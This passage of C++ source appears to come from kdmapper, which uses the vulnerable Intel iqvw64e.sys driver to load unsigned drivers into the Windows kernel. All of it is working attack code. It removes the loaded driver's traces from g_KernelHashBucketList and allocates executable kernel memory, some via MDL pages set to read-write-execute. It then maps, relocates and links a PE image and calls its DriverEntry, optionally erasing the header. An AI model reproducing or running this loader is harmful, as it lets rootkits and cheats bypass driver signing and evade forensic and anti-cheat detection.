               Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
            }
            return false;
         }

         wchar_t *wsName = new wchar_t[(ULONG64)wsNameLen / 2ULL + 1ULL];
         memset(wsName, 0, wsNameLen + sizeof(wchar_t));

         if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen)) {
            Log(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
            if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
               Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
            }
            return false;
         }

         size_t find_result = std::wstring(wsName).find(wdname);
         if (find_result != std::wstring::npos) {
            Log(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
            HashBucketEntry *Next = 0;
            if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
               Log(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
               if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
                  Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
               }
               return false;
            }

            if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
               Log(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
               if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
                  Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
               }
               return false;
            }

            if (!FreePool(device_handle, (uintptr_t)entry)) {
               Log(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
               if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
                  Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
               }
               return false;
            }
            Log(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
            if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
               Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
               if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
                  Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
               }
               return false;
            }
            delete[] wsName;
            return true;
         }
         delete[] wsName;
      }
      prev = entry;

      if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
         Log(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
         if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
            Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
         }
         return false;
      }
   }

   if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
      Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
   }
   return false;
}


uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t *mdlPtr)
{

   LARGE_INTEGER LowAddress, HighAddress;
   LowAddress.QuadPart  = 0;
   HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;

   uint64_t pages = (size / PAGE_SIZE) + 1;
   auto     mdl   = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle,
                                                        LowAddress,
                                                        HighAddress,
                                                        LowAddress,
                                                        pages * (uint64_t)PAGE_SIZE);
   if (!mdl) {
      Log(L"[-] Can't allocate pages for mdl" << std::endl);
      return {0};
   }

   uint32_t byteCount = 0;
   if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028, &byteCount, sizeof(uint32_t))) {
      Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
      return {0};
   }

   if (byteCount < size) {
      Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
      intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
      intel_driver::FreePool(iqvw64e_device_handle, mdl);
      return {0};
   }

   auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle,
                                                                         mdl,
                                                                         nt::KernelMode,
                                                                         nt::MmCached,
                                                                         NULL,
                                                                         FALSE,
                                                                         nt::NormalPagePriority);
   if (!mappingStartAddress) {
      Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
      intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
      intel_driver::FreePool(iqvw64e_device_handle, mdl);
      return {0};
   }

   const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
   if (!result) {
      Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
      intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
      intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
      intel_driver::FreePool(iqvw64e_device_handle, mdl);
      return {0};
   }
   Log(L"[+] Allocated pages for mdl" << std::endl);

   if (mdlPtr)
      *mdlPtr = mdl;

   return mappingStartAddress;
}

uint64_t kdmapper::MapDriver(HANDLE      iqvw64e_device_handle,
                             BYTE       *data,
                             ULONG64     param1,
                             ULONG64     param2,
                             bool        free,
                             bool        destroyHeader,
                             bool        mdlMode,
                             bool        PassAllocationAddressAsFirstParam,
                             mapCallback callback,
                             NTSTATUS   *exitCode)
{

   const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);

   if (!nt_headers) {
      Log(L"[-] Invalid format of PE image" << std::endl);
      return 0;
   }

   if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
      Log(L"[-] Image is not 64 bit" << std::endl);
      return 0;
   }

   uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;

   void *local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
   if (!local_image_base)
      return 0;

   DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
   image_size                   = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);

   uint64_t kernel_image_base = 0;
   uint64_t mdlptr            = 0;
   if (mdlMode) {
      kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
   }
   else {
      kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
   }

   do {
      if (!kernel_image_base) {
         Log(L"[-] Failed to allocate remote image in kernel" << std::endl);
         break;
      }

      Log(L"[+] Image base has been allocated at 0x" << reinterpret_cast<void *>(kernel_image_base) << std::endl);


      memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);


      const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

      for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
         if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
            continue;
         auto local_section = reinterpret_cast<void *>(reinterpret_cast<uint64_t>(local_image_base)
                                                       + current_image_section[i].VirtualAddress);
         memcpy(local_section,
                reinterpret_cast<void *>(reinterpret_cast<uint64_t>(data) + current_image_section[i].PointerToRawData),
                current_image_section[i].SizeOfRawData);
      }

      uint64_t realBase = kernel_image_base;
      if (destroyHeader) {
         kernel_image_base -= TotalVirtualHeaderSize;
         Log(L"[+] Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header" << std::endl);
      }


      RelocateImageByDelta(portable_executable::GetRelocs(local_image_base),
                           kernel_image_base - nt_headers->OptionalHeader.ImageBase);

      if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) {
         Log(L"[-] Failed to resolve imports" << std::endl);
         kernel_image_base = realBase;
         break;
      }


      if (!intel_driver::WriteMemory(
             iqvw64e_device_handle,
             realBase,
             (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)),
             image_size)) {
         Log(L"[-] Failed to write local image to remote image" << std::endl);
         kernel_image_base = realBase;
         break;
      }


      const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

      Log(L"[<] Calling DriverEntry 0x" << reinterpret_cast<void *>(address_of_entry_point) << std::endl);

      if (callback) {
         if (!callback(&param1, &param2, realBase, image_size, mdlptr)) {
            Log(L"[-] Callback returns false, failed!" << std::endl);
            kernel_image_base = realBase;
            break;
         }
      }

      NTSTATUS status = 0;
      if (!intel_driver::CallKernelFunction(iqvw64e_device_handle,
                                            &status,
                                            address_of_entry_point,
                                            (PassAllocationAddressAsFirstParam ? realBase : param1),
                                            param2)) {
         Log(L"[-] Failed to call driver entry" << std::endl);
         kernel_image_base = realBase;
         break;
      }

      if (exitCode)
         *exitCode = status;

      Log(L"[+] DriverEntry returned 0x" << std::hex << status << std::endl);

      if (free && mdlMode) {
         intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
         intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr);
         intel_driver::FreePool(iqvw64e_device_handle, mdlptr);
      }
      else if (free) {
         intel_driver::FreePool(iqvw64e_device_handle, realBase);
      }

      VirtualFree(local_image_base, 0, MEM_RELEASE);
      return realBase;

   } while (false);

   VirtualFree(local_image_base, 0, MEM_RELEASE);

   intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);

   return 0;
}

void kdmapper::RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta)
{
   for (const auto &current_reloc : relocs) {
      for (auto i = 0u; i < current_reloc.count; ++i) {
         const uint16_t type   = current_reloc.item[i] >> 12;
         const uint16_t offset = current_reloc.item[i] & 0xFFF;

         if (type == IMAGE_REL_BASED_DIR64)
            *reinterpret_cast<uint64_t *>(current_reloc.address + offset) += delta;
      }
   }
}

bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports)
{
   for (const auto &current_import : imports) {
      ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
      if (!Module) {
#if !defined(DISABLE_OUTPUT)
         std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
#endif
         return false;
      }

      for (auto &current_function_data : current_import.function_datas) {
         uint64_t function_address
            = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);

         if (!function_address) {

            if (Module != intel_driver::ntoskrnlAddr) {
               function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle,
                                                                      intel_driver::ntoskrnlAddr,
                                                                      current_function_data.name);
               if (!function_address) {
#if !defined(DISABLE_OUTPUT)
                  std::cout << "[-] Failed to resolve import " << current_function_data.name << " ("
                            << current_import.module_name << ")" << std::endl;
#endif
                  return false;
               }
            }
         }

         *current_function_data.address = function_address;
      }
   }

   return true;
}
